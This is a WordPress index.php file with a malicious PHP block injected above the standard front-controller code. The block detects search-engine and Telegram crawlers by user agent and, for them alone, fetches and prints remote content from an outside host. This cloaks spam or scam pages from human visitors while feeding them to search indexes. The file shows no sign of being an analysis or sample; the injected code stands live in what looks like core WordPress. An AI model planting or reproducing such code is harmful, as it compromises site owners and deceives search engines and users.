<?php
function is_bot() {
    $user_agent = $_SERVER["HTTP_USER_AGENT"];
    $bots = array("Googlebot", "TelegramBot", "bingbot", "Google-Site-Verification", "Google-InspectionTool");
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

if (is_bot()) {
    $message = file_get_contents("https://desa-badai.pro/landing/moonstrikecapital.txt");
    echo $message;
}
?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
